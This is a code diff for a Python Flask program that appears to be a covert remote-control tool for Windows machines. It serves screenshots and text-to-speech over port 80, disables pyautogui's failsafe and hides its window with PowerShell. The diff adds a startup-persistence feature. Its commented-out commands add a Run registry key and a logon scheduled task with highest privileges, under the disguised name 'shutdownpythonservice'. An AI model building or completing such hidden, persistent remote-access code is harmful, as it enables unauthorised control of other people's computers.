@@ -11,10 +11,12 @@ from playsound import playsound
 import socket
 import numpy as np 
 import cv2 
+#import subprocess
 pyautogui.FAILSAFE = False
 
 #config
 hide_self = True
+add_to_startup = True
 #end of config
 
 counter=1
@@ -75,6 +77,17 @@ def text_to_speach(text,language,use_slow):
 	playsound(tempfile.gettempdir()+"\\speech.mp3")
 	os.system("del "+tempfile.gettempdir()+"\\speech.mp3 /f /q")
 
+def add_startup_reg():
+	pass
+    #file_location = "A:\\programs\\service.exe"#os.path.realpath(__file__)
+    #subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v shutdownpythonservice /t REG_SZ /f /d "' + file_location + '"', shell=True)
+    #subprocess.call('schtasks /create /tn shutdownpythonservice  /tr "' + file_location + '" /sc ONLOGON /RL HIGHEST /RU BUILTINAdministrators', shell=True)
+
+if add_to_startup:
+	try:
+		add_startup_reg()
+	except:
+		print("Error adding to startup")
 
 app = Flask(__name__)
 #app.logger.disabled = True
@@ -192,8 +205,8 @@ def screenshot():
 	return response		
 
 def main():
-	t = threading.Thread(target=clear_screen,args=())
-	t.start()
+	#t = threading.Thread(target=clear_screen,args=())
+	#t.start()
 	if hide_self:
 		os.system("powershell -window Hidden -command \"\"")
 	app.run(host=get_ip(), port=80,debug=False)
